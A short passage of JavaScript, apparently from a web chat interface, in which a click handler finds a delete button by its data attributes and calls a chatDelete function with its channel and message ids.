                    const btn = e.target.closest('[data-chat-del-ch]');
                    if (btn) chatDelete(btn.dataset.chatDelCh, btn.dataset.chatDelId);
                });
            });
        }
